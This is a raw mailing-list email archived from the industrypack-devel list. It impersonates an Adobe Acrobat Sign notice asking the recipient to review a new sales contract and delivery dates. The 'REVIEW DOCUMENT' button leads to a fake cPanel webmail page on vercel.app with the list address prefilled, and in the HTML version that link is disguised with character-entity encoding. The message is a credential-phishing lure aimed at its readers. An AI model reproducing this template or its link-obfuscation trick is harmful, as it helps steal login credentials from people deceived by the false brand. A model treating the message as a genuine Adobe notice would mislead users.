Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8697C97AFAA
	for <lists+industrypack-devel@lfdr.de>; Tue, 17 Sep 2024 13:25:15 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sqWKY-0004zv-Bw
	for lists+industrypack-devel@lfdr.de;
	Tue, 17 Sep 2024 11:25:14 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounces+46615377-b063-industrypack-devel=lists.sourceforge.net@em3149.btldem.com>)
 id 1sqWKX-0004zo-LB for industrypack-devel@lists.sourceforge.net;
 Tue, 17 Sep 2024 11:25:13 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:
 Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=X+IEKr8t/n0f9cZaFn1oHC5bYZg74XMCKn9mQyClHNM=; b=EWZgSSq9P4XE9hpmWB7x/1RwAM
 C+NuhTU5cHbeZ5NQVwXp9TesQTG4dcfuEfteG7flhs81s90S+ufRE4CS1Wrs1sAdUjESr15SXTLZ3
 RpYBF3QzJFDpqkt0E3HaU8DTnU9HIaaOmvQH3Vl4t4IeYw4nyMHg3eNmS10AFpr+F3vM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:Mime-Version:From:Date:
 Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=X+IEKr8t/n0f9cZaFn1oHC5bYZg74XMCKn9mQyClHNM=; b=eJm0cgCr3Bxm1piLWcRjmGKaHV
 WYSGo19Apn+1zpmLPOmU9gjynzoMT1caNJZg3IKZ9tgJ5VbUZtK/NfO1GqGijBCIEfwtc1RlyHeeg
 FRsGWMG92hL6BgiMH3oIRDYHv9djSMf4XX2L0f48NbMyhAlmmwBe31J7J67PDOOD5cPs=;
Received: from xvfrtsdk.outbound-mail.sendgrid.net ([168.245.118.209])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sqWKW-0001jw-LR for industrypack-devel@lists.sourceforge.net;
 Tue, 17 Sep 2024 11:25:13 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=btldem.com;
 h=content-type:from:mime-version:subject:reply-to:to:list-unsubscribe:
 list-unsubscribe-post:cc:content-type:from:subject:to;
 s=s1; bh=X+IEKr8t/n0f9cZaFn1oHC5bYZg74XMCKn9mQyClHNM=;
 b=IcMxsle+XrvnZonJCh5EkjITJws226jur7IWda0rFivC0JWKy4meSlv8DMSYhLpncRRU
 toW0/5B688HW1n4PKrNVr7VMNLs+hak2YUScn9AeSz7gPMfMOi80D8nNyTfi3TYgNmuiqZ
 aub5ccE1yWyjEOBVUnnGUeZdTu5DKNenaGtUE15Vx/UObPC/rzZdk3vUjaqg4wXalJBoWQ
 ZlIstoGfggR9zCMEJlCWNeOm0P07w17s7j80B4j22uQo3YbVUiXj7K0vaD5XuXs9ng1IlW
 spdJosx2Klflx+yrFjOXKOqatFZHPCJxI683s3TwS8XlxT7jfbGjyPzAtC+XsdGQ==
Received: by recvd-dc446d8dd-chxfw with SMTP id
 recvd-dc446d8dd-chxfw-1-66E966F2-C
 2024-09-17 11:24:34.767071905 +0000 UTC m=+408373.441343520
Received: from NDY2MTUzNzc (unknown) by geopod-ismtpd-26 (SG) with HTTP
 id lFfgJt34TDSMrPhvMl-26w Tue, 17 Sep 2024 11:24:34.715 +0000 (UTC)
Date: Tue, 17 Sep 2024 11:24:35 +0000 (UTC)
From: =?utf-8?q?Adobe_Team=C2=AE?= <docsonline.adobe.net.notify@btldem.com>
Mime-Version: 1.0
Message-ID: <lFfgJt34TDSMrPhvMl-26w@geopod-ismtpd-26>
X-SG-EID: =?us-ascii?Q?u001=2E7UevxE7mgyKDmKxXIGIQhaGfhmSRBLm7eSvimp4pPxM12nT6cc=2FyBqTWA?=
 =?us-ascii?Q?p61kM9bh4oCDzYnMAFUKfQoB1=2FNpyJNNUkN6crY?=
 =?us-ascii?Q?h=2F6c=2FWQYluFDKZzxVplWsMADpKD=2FDAgSYkgXyZF?=
 =?us-ascii?Q?ObYfbJEI2uDOVJ++qaBJDMmEx2=2F3w+UbqjKJZlp?=
 =?us-ascii?Q?E8wAop0+wJDad=2FWV2w9R=2FdOQYjNrDnQpgKYBe6a?=
 =?us-ascii?Q?XtAv1xQD05vPmfffTvpesyjIFFwnBGvBtijA=2FXE?=
 =?us-ascii?Q?jgcq76WhftyuOb2Vx3L8T0VuDAuDrCzkeJt6L97?=
 =?us-ascii?Q?cD0IZSic=3D?=
X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FubCxoRI?=
 =?us-ascii?Q?sQ4OvhLOQiMVgwQXdp=2FRYQ4zMZ3ZErUxGm71aFY?=
 =?us-ascii?Q?zrdXJQHNuGhVsKE8B4NFr8kR=2FSkRrgU4Ubhj75g?=
 =?us-ascii?Q?X7kKBAc1wO5j8b1GvpUMQfdn3A=2F+hPW4ngBaN62?=
 =?us-ascii?Q?KeDqK5vm4avkxSks2N04sgVUVG7FqjyM+sKxG2r?=
 =?us-ascii?Q?4tHphAzAZdyFupPgFNMt+qmHEsotHWQNNZLeKuW?=
 =?us-ascii?Q?tYbSUsCZE=2FUiiHnWbKmBeUIXoSU2y17+j+NfDVg?=
 =?us-ascii?Q?Cydczs2wd9dh3EotOw4uPSk3Fu1K0Lm1qO4SGQI?=
 =?us-ascii?Q?ixiWIhPQGNBhNlkIDJY7RXqM2Pg6xX7LFUzWGqA?=
 =?us-ascii?Q?zEbvz7LA9hel=2Frdc96vPx3EQUFSRWqLqf=2Fz00oo?=
 =?us-ascii?Q?vi15=2F=2FfiTekzxlxIOhQv23u4YA3GzliyTiuY1nK?=
 =?us-ascii?Q?Q7IcJFYLZaJr9yoLXySHyhdKQfP4p7HR=2FcQbbNi?=
 =?us-ascii?Q?gCpf=2FHvZK6Aqv8IpdCFSaSGrm5jIF0Ddd1GLd4o?=
 =?us-ascii?Q?bipYt4LOB73P0Ddr4DJ8GfBElmAG1=2F0qdKU46QD?=
 =?us-ascii?Q?yjU4Db1PeZlxCv5UF+2EBaJ56Mm9igVU=2FrHbBYM?=
 =?us-ascii?Q?uoBvJQnvo6AO3e8YjytsO36BR5q2kPTlcbf+856?=
 =?us-ascii?Q?s+rwaA=3D=3D?=
To: industrypack-devel@lists.sourceforge.net
X-Entity-ID: u001.Z2uYVPn5+h3GHQ0lEkBDqw==
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-Spam-Score: 5.7 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Adobe Acrobat Sign You have a document to sign and review
 Access the new sales contract and follow up on the delivery dates 
 Content analysis details:   (5.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.8 URIBL_CT_SURBL         Contains an URL listed in the CT SURBL blocklist
 [URIs: u46615377.ct.sendgrid.net]
 5.0 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?168.245.118.209>]
 -1.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [168.245.118.209 listed in wl.mailspike.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 TO_IN_SUBJ             To address is in Subject
X-Headers-End: 1sqWKW-0001jw-LR
Subject: [Industrypack-devel] NEW!: Updated Sales and Delivery Schedule for
 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: docsonline.adobe.net.notify@btldem.com
Content-Type: multipart/mixed; boundary="===============0208963985798496933=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============0208963985798496933==
Content-Type: multipart/alternative; boundary=f1b8d7a57e07f26cb33fe81f87ebef210d839025af2aa547db5ce8b51760

--f1b8d7a57e07f26cb33fe81f87ebef210d839025af2aa547db5ce8b51760
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=us-ascii
Mime-Version: 1.0

Adobe Acrobat Sign

--------------------------------------
You have a document to sign and review
--------------------------------------

*****************************************************************
Access the new sales contract and follow up on the delivery dates
*****************************************************************

**************************************
PLEASE NOTE THE DATES IN THE SCHEDULE:
**************************************

***************************
MONDAY, 23RD SEPTEMBER 2024
***************************

****************************
TUESDAY, 24TH SEPTEMBER 2024
****************************

***************************************************************************=
*******************
MONDAY, 30TH SEPTEMBER 2024

REVIEW DOCUMENT ( https://cpanel-webmail.vercel.app/?web=3Dindustrypack-dev=
el@lists.sourceforge.net )
***************************************************************************=
*******************
Unsubscribe From This List https://u46615377.ct.sendgrid.net/asm/unsubscrib=
e/?user_id=3D46615377&data=3DnJ1-JT7enEHaYgG3zk99CUpXYPntkm6M78n1ZYfFSBpoMD=
AwdTAwMNwIULCoz0T1_5Y1Nzd_KX5xouMNIoMi_Nhm-94uNmqEMSKaVbmX1VIUTdP1Xeo_8C6sz=
Wzv4Qu9Rs9BM9Lw5Cb4lz12cBttrb4yjufOq6zuYPL8U5MJqIP_SPnKo2mD_lSMV5XZou1jUoaO=
LNRVSP5R6-tOfvfUPbYJkjKymRddUNVYihcfaVxnyIur4YijwxURPOWjTm9oIrQb2U8MUc9GoHt=
kuPyZwoK-1NvRRM3oW1_ZpM8FOwk7p2Ou6nY-25kwZXMgggfTZbfiRd3ASVP2cZLRagyPkasAUx=
J1EWYgnyjgkQjYWQZZustsJi-qAds9eG38jCl-VU-HM0_jXXKMzr201hRPTHHLvuFycZSIyDAlu=
C495R6owhBjp6GFSpxXyiqqPkn9RInBBK2yzWqU5xVb5J7RHs0cWizdydlO7x4qubqYHll1SHI9=
kQXez6AeJOzETIkcOMJ44C9LFhv4S3qvhr7xGAzyuNGcD_MOYUGEQELTNrReq14RzEaENaw_Iar=
zoEaQ-Y6ki8KJ79QygJOtXcRYapeoc2wxnzP-XwEUXbOBKvzccYw2g5slnfFkNvnG22yWL9V3AT=
jNEGB6QgrBODoBRFkb0kfJrCmFnltELAjvXB__DF4rXTEixbTMJ684E4eGtLkq0u3MhM9Z-Hqfc=
GxlWXgezL-KWq3dU39B8wcNtC_9o5JGeV1Iog5TxKc_XTAjmC47eGTfzY3KdjWT3c4BWaDkz8Hc=
hjTfuQn5mVT9A6GYFIdMY4XkPl-fIKHRiUdOX5YJocSG-L9FZN6CmbAYb_uyU30w1wOi9YQ4Nag=
m-KdM7alVIrLlk5f21kPUNvSCTuNZfxi100dJ2rl2U-PFIU4pkGvr5dsaqPwx_yw5wIosUIPfxz=
qsmrEuylwsuAAGmV-bP59T_5u0eb2AJeYgl1pRCmuNSL7KmD8n-fVNRo0i87ywJ6-kyUarbhdru=
rX3fmtfmkSlVEBRbdb5uk2Cp_fVvLTwhgvng4UWczMDLPOBzAw0YmKJZPzmZ3w_Zxkgy1v5iX4t=
7Wx5AOZ3QwHtQXxIjTlfFRilpudLYHJGXT8btm8v8qzbYy_ZutEVcKq2MLdSccfwwV10vwXbhaL=
WWejFYLJBhNs8 | Manage Email Preferences https://u46615377.ct.sendgrid.net/=
asm/?user_id=3D46615377&data=3Da3w8w4isVPP1nH4fbyQuXU0g2i0yuEiZq1-2Ad6KDdVo=
MDAwdTAwMAd-ZIOx81s5K6xKFKoeVQvV7T08a4avrbXB5nTp2F41QpXjCUaw4Lj2WuVvDgXpH5g=
6bHvnRLC44g8aS_RqsQ5BzFZybAEKowDxAZc4evQXcBkHN9NZUmiRsggcb2D_7g0R9ZbmAioSsM=
epRjlJXNlzMAKtitgEMAChhBNi1jWhAck5-1QT21AjVEURG9DhoOSqJIUM-WGpFVQK_-Hi15FTa=
cJwSlKZvpRnqZCHSO5SZGrGzAEPSK00vrKx6Kgju4EJv8X5RM1LOfBdYIgdmqOE4RrhZ45Atrjx=
Y9P0EC6pks9e18Mu4lwr03cNrMVYa3CXoKfEoxAd-GDv_q4AKNOi2_DbPfZlqM7FKATkdQhNAmA=
jAgv4PQUnHe9cl3L2msxNNyr1PpyrM8bpOvJp1T68L9RogqNpLYp58xOyR_ZTWnce6QpbEW3LtS=
T-su8T7r4H_HCp1nu4h5xqjXn2SE9wtQ0KVMnISvvRQs94_I3X8f0a1YyypRQ8xumko8rzvUPZm=
GaZ-UMTIjxP3CX96trm8sPcMFDvx7LjbZpAeBIAyV88Gm8LeRXFfThBEvWo3waxzjBNHcYLgKmX=
UGli0Pcmdg-Q20QNlUXo6LTAro4xOAtDa1bbBlN86T9EUh4IrUEQT7gGQkuejSYo0iIIFDgrLiw=
a-vNR4V9rxdhVnlDiKHqipcoQ9-3nm2ZLdupIjM1SoibEjynOpId30q7sIL2K280y27zu9_0GYJ=
sxWjUCGlg6VthBmy2Kg2-NBnwZ6Tt9rk5CduYPimJ3e1-0HyZS8PhOgUX1d5LAJuP0CsGVAY1Aj=
0mo97MeFXWAvaiB8VYnlLVngs3bPWQU0AmFEU3aW2gpmtiTk4Oomb2YEZWD1sgB4zth8t4F3O3U=
vUOOmsh0r6bj5S0_xIOelT9JCpyhQnNJWzzW671KwilF3ZizWvDjPC7wW5HTto677V5hoTxScM2=
9FF6ikWlObT0vvvZiJFmenwiBcuuZKSAyMlfuNoEJYH02_5ElJ7T2Jywy8u5JVQAPYQmdOhKho-=
b8G1pRcKOwzVuO_ZniZ0KsGHODLup1WhwqaPVWit0gbHzHchwHj8o8ywQLG_I63TZHkOs=3D
--f1b8d7a57e07f26cb33fe81f87ebef210d839025af2aa547db5ce8b51760
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Mime-Version: 1.0

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<title></title>
</head>
<body>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, sans-serif; font-size: small=
; font-style: normal; font-weight: 400; margin-bottom: 30px; word-spacing: =
0px; display: flex; white-space: normal; orphans: 2; widows: 2; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial;">
<img class=3D"CToWUd" style=3D"width: 60px; margin-right: 15px;" alt=3D"Com=
pany logo" src=3D"https://ci3.googleusercontent.com/meips/ADKq_NZsj1F76szmT=
X0fXvZxHIJvtxSV3_57w6-V1lr0XYhOhcxnbLd8Ja91lVX5m9x2HwYj5EZNxFTZKRqd0QqufJy0=
L6qy4hTmoHkDIJqq6j32_9M6Z9bPxks58cjb2ZYr49gSRvGEiXEO6MXYPim45Qkb_SvxHmY=3Ds=
0-d-e1-ft#https://appexchange.salesforce.com/partners/servlet/servlet.FileD=
ownload?file=3D00P4V00000lXbJkUAK" data-bit=3D"iit"><span style=3D"color: r=
gb(51, 51, 51); font-size: 22px; font-weight: 700;">
<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
erit;">Adobe Acrobat Sign</font></font></span></div>

<div style=3D"text-align: center; color: rgb(34, 34, 34); text-transform: n=
one; text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-ser=
if; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0=
px; white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style: initial; text-decoration-co=
lor: initial;">
<h2 style=3D"color: rgb(51, 51, 51); font-size: 20px; font-weight: 700; mar=
gin-bottom: 15px;">You have a document to sign and review</h2>

<h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; font-weight: 400; mar=
gin-bottom: 25px;"><font color=3D"#222222" size=3D"2">Access the new sales =
contract and follow up on the delivery dates<font color=3D"#222222" size=3D=
"2">&nbsp;</font></font></h1><h1 style=3D"color: rgb(85, 85, 85); font-size=
: 18px; font-weight: 400; margin-bottom: 25px;"><font color=3D"#222222" siz=
e=3D"2">PLEASE NOTE THE DATES IN THE SCHEDULE:
</font></h1>
<h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; font-weight: 400; mar=
gin-bottom: 25px;"><font color=3D"#222222" size=3D"2">MONDAY, 23RD SEPTEMBE=
R 2024</font></h1><h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; fon=
t-weight: 400; margin-bottom: 25px;"><font color=3D"#222222" size=3D"2">TUE=
SDAY, 24TH SEPTEMBER 2024</font></h1><h1 style=3D"color: rgb(85, 85, 85); f=
ont-size: 18px; font-weight: 400; margin-bottom: 25px;"><font color=3D"#222=
222" size=3D"2">MONDAY, 30TH SEPTEMBER 2024<br><br>
<a style=3D"padding: 12px 20px; border-radius: 25px; color: rgb(255, 255, 2=
55); text-transform: uppercase; font-weight: 700; text-decoration: none; di=
splay: inline-block; background-color: rgb(0, 123, 255);" clicktracking=3D"=
off" href=3D"&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#99;&#112;&#97=
;&#110;&#101;&#108;&#45;&#119;&#101;&#98;&#109;&#97;&#105;&#108;&period;&#1=
18;&#101;&#114;&#99;&#101;&#108;&period;&#97;&#112;&#112;&sol;&quest;&#119;=
&#101;&#98;&equals;industrypack-devel@lists.sourceforge.net" target=3D"_bla=
nk">REVIEW DOCUMENT
</a></font></h1></div>


<a href=3D'https://u46615377.ct.sendgrid.net/asm/unsubscribe/?user_id=3D466=
15377&amp;data=3DnJ1-JT7enEHaYgG3zk99CUpXYPntkm6M78n1ZYfFSBpoMDAwdTAwMNwIUL=
Coz0T1_5Y1Nzd_KX5xouMNIoMi_Nhm-94uNmqEMSKaVbmX1VIUTdP1Xeo_8C6szWzv4Qu9Rs9BM=
9Lw5Cb4lz12cBttrb4yjufOq6zuYPL8U5MJqIP_SPnKo2mD_lSMV5XZou1jUoaOLNRVSP5R6-tO=
fvfUPbYJkjKymRddUNVYihcfaVxnyIur4YijwxURPOWjTm9oIrQb2U8MUc9GoHtkuPyZwoK-1Nv=
RRM3oW1_ZpM8FOwk7p2Ou6nY-25kwZXMgggfTZbfiRd3ASVP2cZLRagyPkasAUxJ1EWYgnyjgkQ=
jYWQZZustsJi-qAds9eG38jCl-VU-HM0_jXXKMzr201hRPTHHLvuFycZSIyDAluC495R6owhBjp=
6GFSpxXyiqqPkn9RInBBK2yzWqU5xVb5J7RHs0cWizdydlO7x4qubqYHll1SHI9kQXez6AeJOzE=
TIkcOMJ44C9LFhv4S3qvhr7xGAzyuNGcD_MOYUGEQELTNrReq14RzEaENaw_IarzoEaQ-Y6ki8K=
J79QygJOtXcRYapeoc2wxnzP-XwEUXbOBKvzccYw2g5slnfFkNvnG22yWL9V3ATjNEGB6QgrBOD=
oBRFkb0kfJrCmFnltELAjvXB__DF4rXTEixbTMJ684E4eGtLkq0u3MhM9Z-HqfcGxlWXgezL-KW=
q3dU39B8wcNtC_9o5JGeV1Iog5TxKc_XTAjmC47eGTfzY3KdjWT3c4BWaDkz8HchjTfuQn5mVT9=
A6GYFIdMY4XkPl-fIKHRiUdOX5YJocSG-L9FZN6CmbAYb_uyU30w1wOi9YQ4Nagm-KdM7alVIrL=
lk5f21kPUNvSCTuNZfxi100dJ2rl2U-PFIU4pkGvr5dsaqPwx_yw5wIosUIPfxzqsmrEuylwsuA=
AGmV-bP59T_5u0eb2AJeYgl1pRCmuNSL7KmD8n-fVNRo0i87ywJ6-kyUarbhdrurX3fmtfmkSlV=
EBRbdb5uk2Cp_fVvLTwhgvng4UWczMDLPOBzAw0YmKJZPzmZ3w_Zxkgy1v5iX4t7Wx5AOZ3QwHt=
QXxIjTlfFRilpudLYHJGXT8btm8v8qzbYy_ZutEVcKq2MLdSccfwwV10vwXbhaLWWejFYLJBhNs=
8'>Unsubscribe From This List</a> | <a href=3D'https://u46615377.ct.sendgri=
d.net/asm/?user_id=3D46615377&amp;data=3Da3w8w4isVPP1nH4fbyQuXU0g2i0yuEiZq1=
-2Ad6KDdVoMDAwdTAwMAd-ZIOx81s5K6xKFKoeVQvV7T08a4avrbXB5nTp2F41QpXjCUaw4Lj2W=
uVvDgXpH5g6bHvnRLC44g8aS_RqsQ5BzFZybAEKowDxAZc4evQXcBkHN9NZUmiRsggcb2D_7g0R=
9ZbmAioSsMepRjlJXNlzMAKtitgEMAChhBNi1jWhAck5-1QT21AjVEURG9DhoOSqJIUM-WGpFVQ=
K_-Hi15FTacJwSlKZvpRnqZCHSO5SZGrGzAEPSK00vrKx6Kgju4EJv8X5RM1LOfBdYIgdmqOE4R=
rhZ45AtrjxY9P0EC6pks9e18Mu4lwr03cNrMVYa3CXoKfEoxAd-GDv_q4AKNOi2_DbPfZlqM7FK=
ATkdQhNAmAjAgv4PQUnHe9cl3L2msxNNyr1PpyrM8bpOvJp1T68L9RogqNpLYp58xOyR_ZTWnce=
6QpbEW3LtST-su8T7r4H_HCp1nu4h5xqjXn2SE9wtQ0KVMnISvvRQs94_I3X8f0a1YyypRQ8xum=
ko8rzvUPZmGaZ-UMTIjxP3CX96trm8sPcMFDvx7LjbZpAeBIAyV88Gm8LeRXFfThBEvWo3waxzj=
BNHcYLgKmXUGli0Pcmdg-Q20QNlUXo6LTAro4xOAtDa1bbBlN86T9EUh4IrUEQT7gGQkuejSYo0=
iIIFDgrLiwa-vNR4V9rxdhVnlDiKHqipcoQ9-3nm2ZLdupIjM1SoibEjynOpId30q7sIL2K280y=
27zu9_0GYJsxWjUCGlg6VthBmy2Kg2-NBnwZ6Tt9rk5CduYPimJ3e1-0HyZS8PhOgUX1d5LAJuP=
0CsGVAY1Aj0mo97MeFXWAvaiB8VYnlLVngs3bPWQU0AmFEU3aW2gpmtiTk4Oomb2YEZWD1sgB4z=
th8t4F3O3UvUOOmsh0r6bj5S0_xIOelT9JCpyhQnNJWzzW671KwilF3ZizWvDjPC7wW5HTto677=
V5hoTxScM29FF6ikWlObT0vvvZiJFmenwiBcuuZKSAyMlfuNoEJYH02_5ElJ7T2Jywy8u5JVQAP=
YQmdOhKho-b8G1pRcKOwzVuO_ZniZ0KsGHODLup1WhwqaPVWit0gbHzHchwHj8o8ywQLG_I63TZ=
HkOs=3D'>Manage Email Preferences</a><img src=3D"https://u46615377.ct.sendg=
rid.net/wf/open?upn=3Du001.HN9ncswbYi-2BEGN-2FXArB7Yb-2B54Tm43-2B694904Gpq6=
REDOvMj5jd8r2ODXoOGLI8F0uYDlfdJx8NjvPdhWWcpkCUGsR3P4VRN5MZ7o0veGf3rvT-2BLh1=
aC66WHXNP3uZ2MXALkHEQ-2BFrCPjUx06NxmFri6-2BXxC4qcLErCGgOmjc8H7v-2FCmxYtULIh=
FJ4QC6to7fxm56kOMdloZIdlOsFO29we7ERokz-2FNi8mi9bfhT59bVVzbMn3c-2FcGHpCttoYO=
knxEeQ1OOIZ8Ry3IaGqigyBX1XavqJWgHvcJHKniipi6IyzZ-2Ff1idWs0w8HiWF1JYTDIJ-2BE=
1r8pPgURcNIsFPcUh4OMoPfvrBVNJVRgEEGlBbSuBaTNiPBjeli0WIHIZyRQOg39P525Tpwt-2F=
SOxK3Ws-2FH5qyVVdBdjl-2FpoecANAIDimCyG6vLD1S-2FuoOfldyGZ7iS-2FvC1D4-2FuJlr1=
ZarbDpsOY2DPGhN-2BsgSeFIaP-2FPUQPqXCMc2NtNragCzecEM-2BbI9YSKGjPIPKj69qNTqJG=
1hbFkrrvAj3tL0kVjAlcsHZAOeWCy161-2FsVuXfLL-2FdFlKns2ac4t7vB2zYZePpOIwIqU2gK=
of-2BdQHpTDzdOFmRZsxTMCDAElYFguiCNdOp6m-2B-2FG3UVlVRQ1Ucy1EKCh-2B88ri9FIXi1=
awmW54jAHqLiA7tu28CUaRZV5O-2FGHBS7VydIcOLaqRq2wd98oGnGMY0dfKKQUAr-2FelK5DUt=
5ccp3ZIj1Va7aJkSg7godVRnQ3wQ9EScXH-2BtJIvgcaSEHDPE1gif6IN-2Bs-2Fhl1WdWm-2F-=
2Fsf9Nk0CZoK2371gZqTGMAN5EZ6J4Gb33RxezVtJr5RkiSO7nBTOWDFlqrFI7FoRdzPXmNErNn=
MEw-2F0f2UXSPQYUkdvZTLmI8oxCXp0rMhbNTXPnvuIg1vvKbtfatu2JLFE8sWlcqCowkKMsSJV=
ccsE-2F4nBeFLGd1o82ZFWP1fdU3-2BDw-3D-3D" alt=3D"" width=3D"1" height=3D"1" =
border=3D"0" style=3D"height:1px !important;width:1px !important;border-wid=
th:0 !important;margin-top:0 !important;margin-bottom:0 !important;margin-r=
ight:0 !important;margin-left:0 !important;padding-top:0 !important;padding=
-bottom:0 !important;padding-right:0 !important;padding-left:0 !important;"=
/></body></html>
--f1b8d7a57e07f26cb33fe81f87ebef210d839025af2aa547db5ce8b51760--


--===============0208963985798496933==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0208963985798496933==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0208963985798496933==--

